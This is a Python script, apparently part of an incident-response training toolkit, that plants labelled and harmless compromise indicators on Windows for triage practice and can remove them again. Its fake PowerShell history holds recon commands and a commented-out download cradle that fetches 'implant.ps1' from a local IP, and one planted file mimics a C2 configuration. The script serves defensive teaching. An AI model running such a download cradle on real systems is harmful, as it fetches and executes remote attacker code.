#!/usr/bin/env python3
"""
simulate_windows.py
Windows Compromise Scenario Simulator (HARMLESS)
Part of the Incident Response Triage Toolkit

PURPOSE:
    Creates benign test artifacts that mimic common post-compromise indicators
    so you can run triage.py and see a realistic-looking triage report.

WHAT IT DOES (all harmless):
    1. Writes suspicious-looking commands to PowerShell history
    2. Drops indicator files into TEMP (text files, not real malware)
    3. Creates a clearly-labelled scheduled task (echoes text, does nothing)

USAGE:
    python simulate_windows.py           # plant artifacts
    python simulate_windows.py --cleanup # remove all planted artifacts
    python simulate_windows.py --status  # show what artifacts are present

DISCLAIMER:
    This script is for EDUCATIONAL and PORTFOLIO demonstration only.
    All artifacts are clearly labelled as simulations and are harmless.
"""

import argparse
import os
import shutil
import subprocess
import sys
from datetime import datetime
from pathlib import Path

# Force UTF-8 on narrow-encoding terminals (e.g. Windows cp1252)
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")

TASK_NAME   = "IR_Simulation_PersistenceTask"
SIM_MARKER  = "IR_SIMULATION"
SIM_DIR     = Path(os.environ.get("TEMP", "C:/Temp")) / "ir_simulation"
PS_HIST_DIR = Path(os.environ.get("APPDATA", "")) / \
              "Microsoft" / "Windows" / "PowerShell" / "PSReadLine"
PS_HIST     = PS_HIST_DIR / "ConsoleHost_history.txt"

SEP = "=" * 60


def banner(title: str):
    print(SEP)
    print(f"  {title}")
    print(SEP)


# ── simulate ──────────────────────────────────────────────────────────────────

def simulate_ps_history():
    """Append suspicious-looking (but harmless) commands to PS history."""
    print("\n[*] Planting simulated PowerShell history entries ...")
    PS_HIST_DIR.mkdir(parents=True, exist_ok=True)

    suspicious_entries = [
        f"# {SIM_MARKER}: attacker recon commands (planted by simulate_windows.py)",
        "whoami /all",
        "net user",
        "net localgroup administrators",
        "Get-LocalUser | Where-Object {$_.Enabled -eq $true}",
        "Get-Process | Sort-Object CPU -Descending | Select-Object -First 10",
        "netstat -ano | findstr ESTABLISHED",
        "Get-ScheduledTask | Where-Object {$_.State -ne 'Disabled'}",
        "Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        "# {SIM_MARKER}: simulated download cradle (NOT executed)",
        "# IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/implant.ps1')",
        "systeminfo | findstr /i 'domain'",
        "ipconfig /all",
        "arp -a",
        "Get-WinEvent -LogName Security -MaxEvents 20 -ErrorAction SilentlyContinue",
        f"# {SIM_MARKER}: end of simulation block",
    ]

    existing = PS_HIST.read_text(encoding="utf-8", errors="replace") if PS_HIST.exists() else ""
    if SIM_MARKER in existing:
        print("    [!] Simulation entries already present in PS history — skipping.")
        return

    with PS_HIST.open("a", encoding="utf-8") as fh:
        fh.write("\n" + "\n".join(suspicious_entries) + "\n")

    print(f"    [+] Appended {len(suspicious_entries)} simulated entries to:")
    print(f"        {PS_HIST}")


def simulate_temp_files():
    """Create indicator files in a temp subdirectory."""
    print("\n[*] Creating simulated artifact files in TEMP ...")
    SIM_DIR.mkdir(parents=True, exist_ok=True)

    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    files = {
        "recon_output.txt": (
            f"# {SIM_MARKER} — simulated attacker recon output\n"
            f"# Created: {timestamp}\n\n"
            "Hostname: VICTIM-PC\n"
            "Domain  : CORP.LOCAL\n"
            "Users   : Administrator, jsmith, bkpadmin\n"
            "IP      : 192.168.1.50\n\n"
            "This file is HARMLESS — for IR triage portfolio demo only.\n"
        ),
        "implant_sim.ps1": (
            f"# {SIM_MARKER} — simulated dropped script\n"
            f"# Created: {timestamp}\n\n"
            "# In a real attack this might contain:\n"
            "# - Reverse shell code\n"
            "# - Credential dumping\n"
            "# - Lateral movement commands\n\n"
            "Write-Host 'IR_SIMULATION: This is a harmless placeholder file'\n"
        ),
        "exfil_staging.txt": (
            f"# {SIM_MARKER} — simulated data staging file\n"
            f"# Created: {timestamp}\n\n"
            "Simulated exfiltration staging area.\n"
            "Attackers may compress and encrypt files here before exfil.\n\n"
            "This file is HARMLESS — for IR triage portfolio demo only.\n"
        ),
        "c2_config.txt": (
            f"# {SIM_MARKER} — simulated C2 configuration\n"
            f"# Created: {timestamp}\n\n"
            "c2_host=192.0.2.1          # RFC-5737 documentation IP (not real)\n"
            "c2_port=4444\n"
            "beacon_interval=60\n"
            "jitter=20\n\n"
            "This file is HARMLESS — for IR triage portfolio demo only.\n"
        ),
    }

    for fname, content in files.items():
        fpath = SIM_DIR / fname
        fpath.write_text(content, encoding="utf-8")
        print(f"    [+] Created: {fpath}")


def simulate_scheduled_task():
    """Create a clearly-labelled, harmless scheduled task."""
    print("\n[*] Creating simulated persistence (scheduled task) ...")

    # Check if it already exists
    check = subprocess.run(
        f'schtasks /query /tn "{TASK_NAME}" /fo LIST',
        shell=True, capture_output=True, text=True
    )
    if check.returncode == 0:
        print(f"    [!] Task '{TASK_NAME}' already exists — skipping.")
        return

    cmd = (
        f'schtasks /create /tn "{TASK_NAME}" '
        f'/tr "cmd.exe /c echo {SIM_MARKER}_BEACON >> %TEMP%\\ir_sim_beacon.log" '
        f'/sc ONLOGON /ru SYSTEM /f'
    )
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)

    if result.returncode == 0:
        print(f"    [+] Created scheduled task: {TASK_NAME}")
        print(f"        (Trigger: ONLOGON | Action: echo to log file — harmless)")
    else:
        print(f"    [!] Could not create task (likely needs Admin):")
        if result.stderr:
            print(f"        {result.stderr.strip()}")
        print(f"        Skipping scheduled task simulation.")


# ── cleanup ───────────────────────────────────────────────────────────────────

def cleanup():
    """Remove all planted simulation artifacts."""
    print("\n[*] Removing all simulation artifacts ...")

    # Remove scheduled task
    result = subprocess.run(
        f'schtasks /delete /tn "{TASK_NAME}" /f',
        shell=True, capture_output=True, text=True
    )
    if result.returncode == 0:
        print(f"    [+] Deleted scheduled task: {TASK_NAME}")
    else:
        print(f"    [-] Task '{TASK_NAME}' not found (already removed or never created).")

    # Remove SIM_DIR
    if SIM_DIR.exists():
        shutil.rmtree(SIM_DIR)
        print(f"    [+] Removed simulation directory: {SIM_DIR}")
    else:
        print(f"    [-] Simulation directory not found: {SIM_DIR}")

    # Remove simulation entries from PS history
    if PS_HIST.exists():
        content = PS_HIST.read_text(encoding="utf-8", errors="replace")
        lines = content.splitlines()
        original_count = len(lines)

        # Remove the simulation block (from marker to end marker, inclusive)
        clean_lines = []
        inside_sim  = False
        for line in lines:
            if SIM_MARKER in line:
                inside_sim = True
            if not inside_sim:
                clean_lines.append(line)
            if SIM_MARKER in line and "end of simulation" in line:
                inside_sim = False

        removed = original_count - len(clean_lines)
        PS_HIST.write_text("\n".join(clean_lines) + "\n", encoding="utf-8")
        print(f"    [+] Removed {removed} simulation lines from PS history: {PS_HIST}")
    else:
        print(f"    [-] PS history file not found: {PS_HIST}")

    # Remove beacon log if it exists
    beacon_log = Path(os.environ.get("TEMP", "C:/Temp")) / "ir_sim_beacon.log"
    if beacon_log.exists():
        beacon_log.unlink()
        print(f"    [+] Removed beacon log: {beacon_log}")

    print("\n[+] Cleanup complete.")


# ── status ────────────────────────────────────────────────────────────────────

def status():
    """Report which simulation artifacts are currently present."""
    print()
    print("[*] Checking for simulation artifacts ...")

    # Task
    result = subprocess.run(
        f'schtasks /query /tn "{TASK_NAME}" /fo LIST',
        shell=True, capture_output=True, text=True
    )
    task_present = result.returncode == 0
    print(f"  Scheduled task '{TASK_NAME}': {'[PRESENT]' if task_present else '[NOT FOUND]'}")

    # Temp files
    print(f"  Simulation directory {SIM_DIR}:", end=" ")
    if SIM_DIR.exists():
        files = list(SIM_DIR.iterdir())
        print(f"[PRESENT — {len(files)} file(s)]")
        for f in files:
            print(f"    - {f.name}")
    else:
        print("[NOT FOUND]")

    # PS history
    print(f"  PS history simulation entries:", end=" ")
    if PS_HIST.exists():
        content = PS_HIST.read_text(encoding="utf-8", errors="replace")
        count = content.count(SIM_MARKER)
        print(f"[{'PRESENT' if count else 'NOT FOUND'} — {count} marker(s)]")
    else:
        print("[PS history file not found]")


# ── main ─────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="Windows Compromise Simulator (Harmless)")
    group = parser.add_mutually_exclusive_group()
    group.add_argument("--cleanup", action="store_true", help="Remove all simulation artifacts")
    group.add_argument("--status",  action="store_true", help="Show which artifacts are present")
    args = parser.parse_args()

    banner("WINDOWS COMPROMISE SIMULATION")
    print("  All artifacts are HARMLESS and clearly labelled.")
    print("  Run with --cleanup to remove everything when done.")
    print(SEP)

    if args.cleanup:
        cleanup()
        return
    if args.status:
        status()
        return

    simulate_ps_history()
    simulate_temp_files()
    simulate_scheduled_task()

    print()
    print(SEP)
    print("[+] Simulation complete!")
    print()
    print("  Next steps:")
    print("    1. python triage.py                          (collect artifacts)")
    print("    2. Review triage/triage_*/                   (examine the report)")
    print("    3. python simulate_windows.py --status       (verify artifacts exist)")
    print("    4. python simulate_windows.py --cleanup      (remove when done)")
    print(SEP)


if __name__ == "__main__":
    main()
